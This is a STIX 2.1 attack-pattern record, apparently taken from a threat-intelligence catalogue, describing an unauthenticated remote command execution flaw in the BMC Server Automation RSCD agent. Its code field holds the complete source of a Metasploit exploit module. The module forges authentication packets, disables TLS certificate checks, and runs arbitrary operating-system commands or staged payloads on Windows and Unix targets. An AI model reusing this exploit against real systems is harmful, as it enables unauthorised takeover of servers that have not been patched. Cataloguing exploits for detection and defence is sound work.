{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--35a4faee-ace8-49c2-bf13-d7ddb368410c",
    "created": "2024-08-14T17:06:29.747966Z",
    "modified": "2024-08-14T17:06:29.74797Z",
    "name": "BMC Server Automation RSCD Agent NSH Remote  \\",
    "description": "( This module exploits a weak access control check in the BMC Server Automation RSCD agent that allows arbitrary operating system commands to be executed without authentication. Note: Under Windows, non-powershell commands may need to be prefixed with 'cmd /c'. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/bmc_server_automation_rscd_nsh_rce.rb",
            "external_id": "bmc_server_automation_rscd_nsh_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://insinuator.net/2016/03/bmc-bladelogic-cve-2016-1542-and-cve-2016-1543/"
        },
        {
            "source_name": "reference",
            "url": "https://nickbloor.co.uk/2018/01/01/rce-with-bmc-server-automation/"
        },
        {
            "source_name": "reference",
            "url": "https://nickbloor.co.uk/2018/01/08/improving-the-bmc-rscd-rce-exploit/"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-1542"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-1543"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'BMC Server Automation RSCD Agent NSH Remote ' \\\n                           'Command Execution',\n      'Description'     => %q(\n        This module exploits a weak access control check in the BMC Server\n        Automation RSCD agent that allows arbitrary operating system commands\n        to be executed without authentication.\n        Note: Under Windows, non-powershell commands may need to be prefixed\n              with 'cmd /c'.\n      ),\n      'Author'          =>\n        [\n          'Olga Yanushkevich, ERNW <@yaole0>', # Vulnerability discovery\n          'Nicky Bloor (@NickstaDB) <nick@nickbloor.co.uk>' # RCE payload and Metasploit module\n        ],\n      'References'      =>\n        [\n          ['URL', 'https://insinuator.net/2016/03/bmc-bladelogic-cve-2016-1542-and-cve-2016-1543/'],\n          ['URL', 'https://nickbloor.co.uk/2018/01/01/rce-with-bmc-server-automation/'],\n          ['URL', 'https://nickbloor.co.uk/2018/01/08/improving-the-bmc-rscd-rce-exploit/'],\n          ['CVE', '2016-1542'],\n          ['CVE', '2016-1543']\n        ],\n      'DisclosureDate'  => '2016-03-16',\n      'Privileged'      => false,\n      'Stance'          => Msf::Exploit::Stance::Aggressive,\n      'Platform'        => %w[win linux unix],\n      'Targets'         =>\n        [\n          ['Automatic', {}],\n          [\n            'Windows/VBS Stager', {\n              'Platform' => 'win',\n              'Payload' => { 'Space' => 8100 }\n            }\n          ],\n          [\n            'Unix/Linux', {\n              'Platform' => %w[linux unix],\n              'Payload' => { 'Space' => 32_700 }\n            }\n          ],\n          [\n            'Generic Command', {\n              'Arch' => ARCH_CMD,\n              'Platform' => %w[linux unix win]\n            }\n          ]\n        ],\n      'DefaultTarget'   => 0,\n      'License'         => MSF_LICENSE,\n      'Payload'         => {\n        'BadChars' => \"\\x00\\x09\\x0a\"\n      },\n      'CmdStagerFlavor' => %w[vbs echo])\n    )\n\n    register_options(\n      [\n        Opt::RPORT(4750)\n      ]\n    )\n\n    deregister_options('SRVHOST', 'SRVPORT', 'SSL', 'SSLCert', 'URIPATH')\n  end\n\n  def check\n    # Send agentinfo request and check result\n    vprint_status('Checking for BMC with agentinfo request.')\n    res = send_agentinfo_request\n\n    # Check for successful platform detection\n    if res[0] == 1\n      vprint_good('BMC RSCD agent detected, platform appears to be ' + res[1])\n      return CheckCode::Detected\n    end\n\n    # Get first four bytes of the packet which should hold the content length\n    res_len = res[1] && res[1].length > 3 ? res[1][0..3].unpack('N')[0] : 0\n\n    # Return unknown if the packet format appears correct (length field check)\n    if res[1] && res[1].length - 4 == res_len\n      vprint_warning('Target appears to be BMC, however an unexpected ' \\\n                     'agentinfo response was returned.')\n      vprint_warning('Response: ' + res[1])\n      return CheckCode::Unknown\n    end\n\n    # Invalid response, probably not a BMC RSCD target\n    vprint_error('The target does not appear to be a BMC RSCD agent.')\n    vprint_error('Response: ' + res[1]) if res[1]\n    CheckCode::Safe\n  end\n\n  def exploit\n    # Do auto target selection\n    target_name = target.name\n\n    if target_name == 'Automatic'\n      # Attempt to detect the target platform\n      vprint_status('Detecting remote platform for auto target selection.')\n      platform = send_agentinfo_request\n\n      # Fail if platform detection was unsuccessful\n      if platform[0].zero?\n        fail_with(Failure::UnexpectedReply, 'Unexpected response while ' \\\n                  'detecting target platform.')\n      end\n\n      # Set target based on returned platform\n      target_name = if platform[1].downcase.include?('windows')\n                      'Windows/VBS Stager'\n                    else\n                      'Unix/Linux'\n                    end\n    end\n\n    # Exploit based on target\n    vprint_status('Generating and delivering payload.')\n    if target_name == 'Windows/VBS Stager'\n      if payload.raw.start_with?('powershell', 'cmd')\n        execute_command(payload.raw)\n      else\n        execute_cmdstager(flavor: :vbs, linemax: payload.space)\n      end\n      handler\n    elsif target_name == 'Unix/Linux'\n      execute_cmdstager(flavor: :echo, linemax: payload.space)\n      handler\n    elsif target_name == 'Generic Cmd'\n      send_nexec_request(payload.raw, true)\n    end\n  end\n\n  # Execute a command but don't print output\n  def execute_command(command, opts = {})\n    if opts[:flavor] == :vbs\n      if command.start_with?('powershell') == false\n        if command.start_with?('cmd') == false\n          send_nexec_request('cmd /c ' + command, false)\n          return\n        end\n      end\n    end\n    send_nexec_request(command, false)\n  end\n\n  # Connect to the RSCD agent and execute a command via nexec\n  def send_nexec_request(command, show_output)\n    # Connect and auth\n    vprint_status('Connecting to RSCD agent and sending fake auth.')\n    connect_to_rscd\n    send_fake_nexec_auth\n\n    # Generate and send the payload\n    vprint_status('Sending command to execute.')\n    sock.put(generate_cmd_pkt(command))\n\n    # Finish the nexec request\n    sock.put(\"\\x00\\x00\\x00\\x22\\x30\\x30\\x30\\x30\\x30\\x30\\x31\\x61\\x30\\x30\\x30\" \\\n             \"\\x30\\x30\\x30\\x31\\x32\\x77\\x38\\x30\\x3b\\x34\\x31\\x3b\\x33\\x39\\x30\" \\\n             \"\\x35\\x38\\x3b\\x32\\x34\\x38\\x35\\x31\")\n    sock.put(\"\\x00\\x00\\x00\\x12\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x61\\x30\\x30\\x30\" \\\n             \"\\x30\\x30\\x30\\x30\\x32\\x65\\x7f\")\n    sock.put(\"\\x00\\x00\\x00\\x12\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x61\\x30\\x30\\x30\" \\\n             \"\\x30\\x30\\x30\\x30\\x32\\x69\\x03\")\n    sock.put(\"\\x00\\x00\\x00\\x12\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x61\\x30\\x30\\x30\" \\\n             \"\\x30\\x30\\x30\\x30\\x32\\x74\\x31\")\n    sock.put(\"\\x00\\x00\\x00\\x1c\\x30\\x30\\x30\\x30\\x30\\x30\\x31\\x34\\x30\\x30\\x30\" \\\n             \"\\x30\\x30\\x30\\x30\\x63\\x77\\x38\\x30\\x3b\\x34\\x31\\x3b\\x38\\x30\\x3b\" \\\n             \"\\x34\\x31\")\n    sock.put(\"\\x00\\x00\\x00\\x11\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x39\\x30\\x30\\x30\" \\\n             \"\\x30\\x30\\x30\\x30\\x31\\x7a\")\n\n    # Get the response from the RSCD agent and disconnect\n    vprint_status('Reading response from RSCD agent.')\n    res = read_cmd_output\n    if show_output == true\n      if res && res[0] == 1\n        print_good(\"Output\\n\" + res[1])\n      else\n        print_warning('Command execution failed, the command may not exist.')\n        vprint_warning(\"Output\\n\" + res[1])\n      end\n    end\n    disconnect\n  end\n\n  # Attempt to retrieve RSCD agent info and return the platform string\n  def send_agentinfo_request\n    # Connect and send fake auth\n    vprint_status('Connecting to RSCD agent and sending fake auth.')\n    connect_to_rscd\n    send_fake_agentinfo_auth\n\n    # Send agentinfo request, read the response, and disconnect\n    vprint_status('Requesting agent information.')\n    sock.put(\"\\x00\\x00\\x00\\x32\\x30\\x30\\x30\\x30\\x30\\x30\\x32\\x61\\x30\\x30\\x30\" \\\n             \"\\x30\\x30\\x30\\x31\\x30\\x36\\x34\\x3b\\x30\\x3b\\x32\\x3b\\x36\\x66\\x37\" \\\n             \"\\x3b\\x38\\x38\\x30\\x3b\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x32\\x34\" \\\n             \"\\x31\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\")\n    res = sock.get_once\n    disconnect\n\n    # Return the platform field from the response if it looks valid\n    res_len = res.length > 3 ? res[0..3].unpack('N')[0] : 0\n    return [1, res.split(';')[4]] if res &&\n                                     res.split(';').length > 6 &&\n                                     res.length == (res_len + 4)\n\n    # Invalid or unexpected response format, return the complete response\n    [0, res]\n  end\n\n  # Connect to the target and upgrade to an encrypted connection\n  def connect_to_rscd\n    connect\n    sock.put('TLS')\n    sock.extend(Rex::Socket::SslTcp)\n    sock.sslctx = OpenSSL::SSL::SSLContext.new(:SSLv23)\n    sock.sslctx.verify_mode = OpenSSL::SSL::VERIFY_NONE\n    sock.sslctx.options = OpenSSL::SSL::OP_ALL\n    sock.sslctx.ciphers = 'ALL'\n    sock.sslsock = OpenSSL::SSL::SSLSocket.new(sock, sock.sslctx)\n    sock.sslsock.connect\n  end\n\n  # Send fake agentinfo auth packet and ignore the response\n  def send_fake_agentinfo_auth\n    sock.put(\"\\x00\\x00\\x00\\x5e\\x30\\x30\\x30\\x30\\x30\\x30\\x35\\x36\\x30\\x30\\x30\" \\\n             \"\\x30\\x30\\x30\\x31\\x31\\x36\\x35\\x3b\\x30\\x3b\\x33\\x35\\x3b\\x38\\x38\" \\\n             \"\\x30\\x3b\\x38\\x38\\x30\\x3b\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x33\\x35\" \\\n             \"\\x30\\x3b\\x30\\x3b\\x37\\x3b\" + rand_text_alpha(7) + \"\\x3b\\x39\" \\\n             \"\\x3b\\x61\\x67\\x65\\x6e\\x74\\x69\\x6e\\x66\\x6f\\x3b\\x2d\\x3b\\x2d\\x3b\" \\\n             \"\\x30\\x3b\\x2d\\x3b\\x31\\x3b\\x31\\x3b\\x37\\x3b\" + rand_text_alpha(7) +\n             \"\\x3b\\x55\\x54\\x46\\x2d\\x38\")\n    sock.get_once\n  end\n\n  # Send fake nexec auth packet and ignore the  response\n  def send_fake_nexec_auth\n    sock.put(\"\\x00\\x00\\x00\\x5a\\x30\\x30\\x30\\x30\\x30\\x30\\x35\\x32\\x30\\x30\\x30\" \\\n             \"\\x30\\x30\\x30\\x31\\x31\\x36\\x35\\x3b\\x30\\x3b\\x33\\x31\\x3b\\x64\\x61\" \\\n             \"\\x34\\x3b\\x64\\x61\\x34\\x3b\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x33\\x31\" \\\n             \"\\x30\\x3b\\x30\\x3b\\x37\\x3b\" + rand_text_alpha(7) + \"\\x3b\\x35\" \\\n             \"\\x3b\\x6e\\x65\\x78\\x65\\x63\\x3b\\x2d\\x3b\\x2d\\x3b\\x30\\x3b\\x2d\\x3b\" \\\n             \"\\x31\\x3b\\x31\\x3b\\x37\\x3b\" + rand_text_alpha(7) + \"\\x3b\\x55\" \\\n             \"\\x54\\x46\\x2d\\x38\")\n    sock.get_once\n  end\n\n  # Generate a payload packet\n  def generate_cmd_pkt(command)\n    # Encode back slashes\n    pkt = command.gsub('\\\\', \"\\xc1\\xdc\")\n\n    # Encode double quotes unless powershell is being used\n    pkt = pkt.gsub('\"', \"\\xc2\\x68\") unless pkt.start_with?('powershell')\n\n    # Construct the body of the payload packet\n    pkt = pad_number(pkt.length + 32) + \"\\x30\\x30\\x30\\x30\\x30\\x30\\x31\\x30\" \\\n          \"\\x62\\x37\\x3b\\x30\\x3b\\x32\\x3b\\x63\\x61\\x65\\x3b\\x64\\x61\\x34\\x3b\\x30\" +\n          pad_number(pkt.length) + pkt\n\n    # Prefix with the packet length and return\n    [pkt.length].pack('N') + pkt\n  end\n\n  # Convert the given number to a hex string padded to 8 chars\n  def pad_number(num)\n    format('%08x', num)\n  end\n\n  # Read the command output from the server\n  def read_cmd_output\n    all_output = ''\n    response_done = false\n\n    # Read the entire response from the RSCD service\n    while response_done == false\n      # Read a response chunk\n      chunk = sock.get_once\n      next unless chunk && chunk.length > 4\n      chunk_len = chunk[0..3].unpack('N')[0]\n      chunk = chunk[4..chunk.length]\n      chunk += sock.get_once while chunk.length < chunk_len\n\n      # Check for the \"end of output\" chunk\n      if chunk_len == 18 && chunk.start_with?(\"\\x30\\x30\\x30\\x30\\x30\\x30\\x30\" \\\n                                              \"\\x61\\x30\\x30\\x30\\x30\\x30\\x30\" \\\n                                              \"\\x30\\x32\\x78\")\n        # Response has completed\n        response_done = true\n      elsif all_output == ''\n        # Keep the first response chunk as-is\n        all_output += chunk\n\n        # If the command failed, we're done\n        response_done = true unless all_output[8..15].to_i(16) != 1\n      else\n        # Append everything but the length fields to the output buffer\n        all_output += chunk[17..chunk.length]\n      end\n    end\n\n    # Return output if response indicated success\n    return [1, all_output[26..all_output.length]] if\n            all_output &&\n            all_output.length > 26 &&\n            all_output[8..15].to_i(16) == 1\n\n    # Return nothing if there isn't enough data for error output\n    return [0, ''] unless all_output && all_output.length > 17\n\n    # Get the length of the error output and return the error\n    err_len = all_output[8..15].to_i(16) - 1\n    [0, all_output[17..17 + err_len]]\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-03-16",
    "x_mitre_platforms": [
        "%w[linux unix win]"
    ]
}